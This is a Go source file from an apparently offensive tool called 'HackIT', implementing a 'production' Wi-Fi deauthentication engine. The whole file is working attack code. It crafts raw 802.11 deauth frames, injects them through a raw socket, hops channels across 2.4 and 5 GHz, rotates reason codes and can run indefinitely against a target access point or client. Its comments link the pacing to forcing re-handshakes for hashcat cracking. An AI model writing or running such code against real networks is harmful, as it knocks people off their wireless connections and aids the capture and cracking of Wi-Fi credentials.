// deauth_engine.go — production deauth engine for the HackIT Go worker.
//
// FR: this file supersedes the simplistic fire-and-forget path with a
// channel-hopping, reason-rotating, dual-band deauth engine that keeps
// hitting the target BSSID while the radio moves across 2.4 + 5 GHz.
//
// Usage from the CLI (see main.go):
//   hackit-worker deauth <iface> <bssid> [station] [--count N] [--reason R] [--hop]
//
// FR: --count 0 keeps going until SIGINT. --hop rotates channels in place.
// --reason 0 rotates through all 802.11 reason codes.

package main

import (
	"encoding/hex"
	"fmt"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"syscall"
	"time"
)

// 2.4 GHz (1–13) + 5 GHz (UNII-1/2/2e/3) channel set used for hopping.
var deauthChannels24 = []int{1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13}
var deauthChannels5 = []int{
	36, 40, 44, 48, 52, 56, 60, 64,
	100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144,
	149, 153, 157, 161, 165, 169,
}

// Reason codes worth cycling. Clients accept different codes.
var deauthReasonCodes = []uint16{1, 2, 3, 4, 6, 7, 15}

// parseMAC accepts colon- or dash-separated, mixed case.
func parseMAC(mac string) ([]byte, error) {
	normalized := strings.ReplaceAll(mac, "-", ":")
	parts := strings.Split(normalized, ":")
	if len(parts) != 6 {
		return nil, fmt.Errorf("bad MAC %q", mac)
	}
	out := make([]byte, 6)
	for i, p := range parts {
		if len(p) != 2 {
			return nil, fmt.Errorf("bad MAC octet %q", p)
		}
		v, err := hex.DecodeString(p)
		if err != nil || len(v) != 1 {
			return nil, fmt.Errorf("bad MAC octet %q", p)
		}
		out[i] = v[0]
	}
	return out, nil
}

// buildDeauthFrame builds the radiotap + 802.11 deauth frame.
func buildDeauthMgmtFrame(bssid, station []byte, reason uint16, seq uint16) []byte {
	// Radiotap: 12 bytes, no flags (injection path uses hardware default).
	radiotap := []byte{0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
	fc := []byte{0xC0, 0x00} // management, deauth
	dur := []byte{0x01, 0x3A}
	sc := uint16((seq & 0xFFF) << 4)
	frame := make([]byte, 0, len(radiotap)+24+2)
	frame = append(frame, radiotap...)
	frame = append(frame, fc...)
	frame = append(frame, dur...)
	frame = append(frame, station...) // addr1 = destination
	frame = append(frame, bssid...)   // addr2 = source (AP)
	frame = append(frame, bssid...)   // addr3 = BSSID
	frame = append(frame, byte(sc), byte(sc>>8))
	frame = append(frame, byte(reason), byte(reason>>8))
	return frame
}

// openRawSocket returns an AF_PACKET raw socket bound to the interface.
func openRawSocket(iface string) (int, error) {
	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(syscall.ETH_P_ALL)))
	if err != nil {
		return -1, fmt.Errorf("raw socket: %w", err)
	}
	ifi, err := net.InterfaceByName(iface)
	if err != nil {
		syscall.Close(fd)
		return -1, fmt.Errorf("interface %s: %w", iface, err)
	}
	addr := syscall.SockaddrLinklayer{
		Protocol: htons(syscall.ETH_P_ALL),
		Ifindex:  ifi.Index,
	}
	if err := syscall.Bind(fd, &addr); err != nil {
		syscall.Close(fd)
		return -1, fmt.Errorf("bind: %w", err)
	}
	return fd, nil
}

// setChannel switches the radio to ch via `iw` (requires monitor mode).
func setChannel(iface string, ch int) {
	if runtime.GOOS == "windows" {
		return
	}
	_ = exec.Command("iw", "dev", iface, "set", "channel", fmt.Sprintf("%d", ch)).Run()
}

// deauthEngineOpts collects run knobs for the CLI.
type deauthEngineOpts struct {
	Iface    string
	BSSID    string
	Station  string // empty → broadcast
	Count    int    // 0 → run until Ctrl+C
	Reason   uint16 // 0 → rotate
	Hop      bool   // hop channels across 2.4 + 5 GHz
	HopDelay int    // ms per channel
}

// runDeauthEngine is the CLI entry point.
func runDeauthEngine(opts deauthEngineOpts) error {
	if runtime.GOOS != "linux" {
		return fmt.Errorf("deauth requires Linux AF_PACKET (monitor mode)")
	}
	bssid, err := parseMAC(opts.BSSID)
	if err != nil {
		return err
	}
	targeted := opts.Station != "" && !strings.EqualFold(opts.Station, "bcast")
	var station []byte
	if targeted {
		if station, err = parseMAC(opts.Station); err != nil {
			return err
		}
	} else {
		station = []byte{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
	}

	fd, err := openRawSocket(opts.Iface)
	if err != nil {
		return err
	}
	defer syscall.Close(fd)

	// SIGINT stops the loop gracefully; count=0 means "until interrupt".
	stopC := make(chan os.Signal, 1)
	signal.Notify(stopC, syscall.SIGINT, syscall.SIGTERM)
	defer signal.Stop(stopC)

	channels := deauthChannels24
	if opts.Hop {
		channels = append(append([]int{}, deauthChannels24...), deauthChannels5...)
	}
	if opts.HopDelay <= 0 {
		opts.HopDelay = 100
	}

	fmt.Fprintf(os.Stderr, "[GO-DEAUTH] %s → %s (targeted=%v) hop=%v reason=%d count=%d\n",
		opts.BSSID, opts.Station, targeted, opts.Hop, opts.Reason, opts.Count)

	var sent uint64 = 0
	var seq uint16 = 0
	var chIdx int = 0
	startTime := time.Now()
	lastReport := time.Now()

	for {
		select {
		case <-stopC:
			fmt.Fprintf(os.Stderr, "\n[GO-DEAUTH] interrupted after %d frames\n", sent)
			return nil
		default:
		}

		if opts.Hop {
			setChannel(opts.Iface, channels[chIdx%len(channels)])
			chIdx++
		}

		reason := opts.Reason
		if reason == 0 {
			reason = deauthReasonCodes[int(seq)%len(deauthReasonCodes)]
		}

		// Broadcast: AP → every client.
		f := buildDeauthMgmtFrame(bssid, []byte{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, reason, seq)
		if n, werr := syscall.Write(fd, f); werr == nil && n > 0 {
			sent++
		}
		seq = (seq + 1) & 0xFFF

		if targeted {
			// Targeted: AP → client and client → AP.
			f1 := buildDeauthMgmtFrame(bssid, station, reason, seq)
			if n, werr := syscall.Write(fd, f1); werr == nil && n > 0 {
				sent++
			}
			seq = (seq + 1) & 0xFFF
			f2 := buildDeauthMgmtFrame(station, bssid, reason, seq)
			if n, werr := syscall.Write(fd, f2); werr == nil && n > 0 {
				sent++
			}
			seq = (seq + 1) & 0xFFF
		}

		if time.Since(lastReport) >= 200*time.Millisecond {
			elapsedNow := time.Since(startTime).Seconds()
			rate := float64(sent) / elapsedNow
			fmt.Fprintf(os.Stderr, "\r[GO-DEAUTH] sent=%d rate=%.0f p/s last_ch=%d reason=%d   ",
				sent, rate, channels[chIdx%len(channels)], reason)
			// Also emit a newline-delimited line on stdout so the Python
			// executor's line-oriented parser sees the counters.
			fmt.Fprintf(os.Stdout, "sent=%d rate=%.0f p/s last_ch=%d reason=%d\n",
				sent, rate, channels[chIdx%len(channels)], reason)
			lastReport = time.Now()
		}

		if opts.Count > 0 && sent >= uint64(opts.Count) {
			fmt.Fprintf(os.Stderr, "\n[GO-DEAUTH] count reached: %d frames\n", sent)
			fmt.Fprintf(os.Stdout, "sent=%d rate=0 p/s count_reached=1\n", sent)
			return nil
		}

		// Pacing: 5ms per loop gives ~200/s per-frame stream; with broadcast+
		// unicast targeted that doubles to ~400/s. This matches hashcat-era
		// re-handshake pressure without saturating the driver queue.
		if !opts.Hop {
			time.Sleep(5 * time.Millisecond)
		} else {
			time.Sleep(time.Duration(opts.HopDelay) * time.Millisecond)
		}
	}
}
